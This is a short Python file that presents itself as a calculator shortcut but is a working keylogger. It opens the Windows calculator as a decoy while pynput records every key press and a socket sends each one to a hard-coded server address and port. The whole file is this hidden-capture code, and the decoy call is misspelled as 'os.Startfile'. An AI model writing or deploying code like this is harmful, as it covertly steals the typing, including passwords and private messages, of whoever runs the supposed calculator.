'''
dieter whittingham
january 22 2024
calculator_shortcut.py
client file
'''

from pynput import keyboard
from pynput.keyboard import Key, Listener
import os, sys

import socket

# socket constants
HEADER = 8
PORT = 9999
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!d'
# no static ip: add the ip manually
# server's ip address
SERVER = '10.32.153.179'
ADDR = (SERVER, PORT)

# set up client socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to the server
client.connect(ADDR)

# function for sending key presses to the server
# parameters: key - string
def handleKeyPress(key):
    msg_str = str(key)
    # encoding the message with utf-8
    msg_encoded = msg_str.encode(FORMAT)
    # need to send header, so get length
    msg_length = len(msg_encoded)
    # encoding the header as a string
    send_length = str(msg_length).encode(FORMAT)
    # need to ensure send_length is 8 bytes long
    # therefore we need to add empty space
    # adding byte representations of spaces
    send_length += b' ' * (HEADER - len(send_length))
    # send header
    client.send(send_length)
    # send message
    client.send(msg_encoded)

# function to set up the key listener 
def listen():
    #creating listener object
    listener = keyboard.Listener(on_press=handleKeyPress)
    listener.start()
    print('[LISTENING] client is listening for input')
    #getting input
    input()

# main execution
if __name__ == '__main__':
    # open windows calculator
    if sys.platform == 'win32':
        os.Startfile('C:\WINDOWS\system32\calc.exe')
    listen()

